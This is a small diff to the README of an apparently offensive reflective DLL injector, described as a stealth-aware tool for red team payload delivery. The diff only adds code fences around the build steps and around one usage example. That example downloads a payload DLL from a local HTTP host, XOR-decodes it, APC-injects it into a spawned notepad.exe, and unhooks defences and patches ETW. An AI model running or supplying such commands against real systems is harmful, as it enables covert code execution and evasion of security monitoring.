@@ -1,10 +1,11 @@
 # Reflective DLL Injector
 [where CMakeList is]
+```bash 
 mkdir build
 cd build
 cmake .. -G "Visual Studio 17 2022" 
 cmake --build .
-
+```
 This project is a modular, stealth-aware reflective DLL injector designed for:
 
 - Red team payload delivery
@@ -99,9 +100,11 @@ Examples
 🔹 Embedded DLL into running notepad.exe
 
 Download + XOR-decode and APC inject:
+```bash
 DLLInjector.exe ^
   --uri http://192.168.1.100/payload.dll ^
   --xor mykey ^
   --spawn "C:\\Windows\\System32\\notepad.exe" ^
   --exec apc ^
   --unhook --patch-etw
+```
